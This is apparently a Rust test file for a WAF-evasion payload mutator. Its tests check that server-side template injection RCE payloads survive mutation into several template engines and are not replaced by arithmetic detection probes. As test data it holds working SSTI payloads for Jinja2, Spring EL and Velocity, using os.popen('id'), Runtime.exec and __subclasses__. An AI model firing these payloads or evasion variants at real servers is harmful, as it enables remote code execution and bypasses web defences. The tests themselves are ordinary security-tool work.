//! SSTI twin of the SQL/XSS/cmd/path preservation contracts.
//!
//! Bug pinned: `template::mutate` dumped the canned `{{7*7}}`
//! engine-fingerprint library for EVERY input, so a real RCE
//! `{{cycler.__init__.__globals__.os.popen('id').read()}}` "mutated"
//! into `{{7*7}}` — a mere *detection* probe. The de-rigged bench
//! would then claim "RCE bypassed the WAF" when only arithmetic was
//! ever sent. Proving side: a structured RCE/exfil expression is
//! re-templated into every engine and never replaced by `7*7`.
//! Adversarial twin: a bare `{{user}}` / `${7*7}` probe STILL gets the
//! canned engine-fingerprint arsenal (that IS its correct product).

use wafrift_grammar::grammar::template;

const CANNED_PROBES: &[&str] = &[
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{7*'7'}}",
    "49",
    "${{<%[%'\"}}%\\.",
];

#[test]
fn rce_expression_is_never_replaced_by_an_arithmetic_probe() {
    let attack = "{{cycler.__init__.__globals__.os.popen('id').read()}}";
    let variants = template::mutate(attack);
    assert!(!variants.is_empty(), "no variants for a real SSTI RCE");
    for v in &variants {
        assert!(
            !CANNED_PROBES.contains(&v.as_str()),
            "RCE was REPLACED by canned detection probe {v:?}"
        );
        let lc = v.to_ascii_lowercase();
        assert!(
            lc.contains("popen") || lc.contains("globals") || lc.contains("cycler"),
            "variant {v:?} no longer carries the RCE expression"
        );
    }
    // Re-templated into other engines (not just echoed back).
    assert!(
        variants.iter().any(|v| v.starts_with("${")),
        "RCE was not re-templated into a ${{}}-delimited engine"
    );
    assert!(
        variants.iter().any(|v| v.starts_with("<%")),
        "RCE was not re-templated into an ERB/EJS engine"
    );
}

#[test]
fn java_and_velocity_rce_keep_their_construct() {
    let cases: &[(&str, &[&str])] = &[
        (
            "${T(java.lang.Runtime).getRuntime().exec(\"id\")}",
            &["runtime", "exec"],
        ),
        (
            "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\")",
            &["runtime", "getclass"],
        ),
        (
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            &["subclasses", "class"],
        ),
    ];
    for (attack, must_have_any) in cases {
        let variants = template::mutate(attack);
        assert!(!variants.is_empty(), "no variants for {attack:?}");
        for v in &variants {
            assert!(
                !CANNED_PROBES.contains(&v.as_str()),
                "{attack:?} was replaced by canned {v:?}"
            );
            let lc = v.to_ascii_lowercase();
            assert!(
                must_have_any.iter().any(|k| lc.contains(k)),
                "variant {v:?} of {attack:?} lost its RCE construct"
            );
        }
    }
}

#[test]
fn adversarial_twin_detection_probe_keeps_canned_arsenal() {
    // `{{user}}` / `${7*7}` are engine-fingerprint probes — the canned
    // library IS the correct product. The gate must not kill it.
    let v = template::mutate("{{user}}");
    assert!(
        v.iter().any(|s| s == "{{7*7}}"),
        "lost the canned {{7*7}} engine probe for a bare detection input"
    );
    assert!(
        v.iter().any(|s| s.contains("__class__.__mro__")),
        "lost the canned jinja RCE library entries for a detection input"
    );
    let v2 = template::mutate("${7*7}");
    assert!(
        v2.iter().any(|s| s == "${7*7}" || s.contains("<#assign")),
        "lost the canned freemarker arsenal for a detection input"
    );
}

#[test]
fn evade_path_preserves_rce_expression() {
    use wafrift_grammar::grammar::{PayloadType, mutate_as};
    let attack = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}";
    let out = mutate_as(attack, PayloadType::TemplateInjection, 80);
    assert!(!out.is_empty());
    // The mutate_as arm additionally appends the SSTI+XSS polyglot
    // probe (a legitimate additive probe, like the SQL+XSS polyglot in
    // the SQL arm) — so forbid only the *arithmetic* detection probes
    // that would mean the RCE itself was discarded.
    const ARITH_PROBES: &[&str] = &[
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{7*'7'}}",
        "49",
    ];
    for m in &out {
        assert!(
            !ARITH_PROBES.contains(&m.payload.as_str()),
            "evade-path replaced the RCE with canned arithmetic probe {:?}",
            m.payload
        );
    }
    assert!(
        out.iter()
            .any(|m| m.payload.to_ascii_lowercase().contains("popen")
                || m.payload.to_ascii_lowercase().contains("globals")),
        "evade-path produced no variant carrying the RCE expression"
    );
}
